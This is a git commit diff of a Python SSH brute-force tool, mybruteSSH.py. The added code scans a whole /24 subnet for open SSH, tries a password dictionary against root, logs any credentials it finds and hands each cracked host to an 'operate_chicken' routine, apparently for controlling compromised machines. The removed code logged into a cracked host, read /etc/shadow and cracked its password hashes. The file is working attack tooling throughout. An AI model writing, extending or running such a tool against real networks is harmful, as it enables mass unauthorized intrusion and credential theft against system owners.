312283c2f02a7d8c5eee997eedc523c9263a54f3
riverchu <churiver@protonmail.com>
2018-06-06 02:09:28 -0400

    精简入口py

--- mybruteSSH.py
+++ mybruteSSH.py
@@ -1,44 +1,50 @@
 #!/usr/bin/env python3
 # coding=utf-8
-__author__="riverchu"
+__author__ = "riverchu"
 
+import time
 import optparse
 
-from scan import resolveIP
-from brute import bruteSSH,loginSSH,bruteUnixPasswd
+from operate import *
+from scan.nmapscan import *
 
-def brute(host,user,dictionary,*,connections):
-    target=(host,user)
-    dic = dict()
-    dic['passwdFile']=dictionary
-    dic['maxConnection']=connections
+MAX_CONNECTIONS = 10
+OPERATE_INTERVAL = 3
 
-    info = bruteSSH.bruteSSH(*target,**dic)
 
-    return info
+def start_chu_brute(brute_type, host, user, dictionary, *, thread_num=MAX_CONNECTIONS):
+    if brute_type is 'ssh':
+        print('[+] Start scan host '+host)
+        for open_host_info in ssh_scan_all(host, 22):
+            print('[*] Start brute ', open_host_info['ip'])
+            brute_ret = brute(open_host_info['ip'], user, dictionary, connections=thread_num)
+            with open(CHICKEN_PATH+'scan.log', 'a') as logfile:
+                json.dump(brute_ret, logfile)
+                logfile.write('\n')
+            if brute_ret['key'] is None:
+                continue
+            print('[+] Brute '+open_host_info['ip']+' result:',
+                  'user: '+brute_ret['user'],
+                  'password: '+brute_ret['key'])
+            time.sleep(OPERATE_INTERVAL)
+            operate_chicken(brute_ret)
+        print('[+] End scan.')
 
-def login(loginInfo):
-    if loginInfo['type']=='password' and loginInfo['key']!=None:
-        return loginSSH.start_ssh(loginInfo['host'],loginInfo['user'],loginInfo['key'])
 
-def scan():
-    pass
+def main(host, user, dictionary, *, thread_num=MAX_CONNECTIONS):
+    # 需增加排除ip功能
+    print('[+] Test ssh scan and brute.')
+    start_chu_brute('ssh', host, user, dictionary, thread_num=thread_num)
 
-def main(host,user,dictionary,*,connections=10):
-    for i in resolveIP.resolveIP('10.108.36.71'):
-        pass
-    info = brute(host,user,dictionary,connections=connections)
-    if not info['key']:return
-    handle = login(info)
-    if handle:
-        ret = loginSSH.send_command(handle,'cat /etc/shadow')
-        t = ret.split('\n')
-        for line in ret.split('\n')[:-1]:
-            passwdInfo = bruteUnixPasswd.crack_unix_passwd(line,dic='./data/dictionary.txt')
-            print('user:',passwdInfo[0],'\tpassword:',passwdInfo[1])
 
-if __name__=="__main__":
-    host = '10.108.36.71'
+if __name__ == "__main__":
+    host = '10.108.36.71/24'
     user = 'root'
-    dictionary = './data/dictionary.txt'
-    main(host,user,dictionary)
+    main(host, user, SSH_DICTIONARY)
+    # file_info = read_file()
+    # for info in file_info:
+    #     print(info)
+    #     if file_info[info]['key'] == 'None':
+    #         continue
+    #     # operate_chicken(file_info[info])
+    #     print(file_info[info])
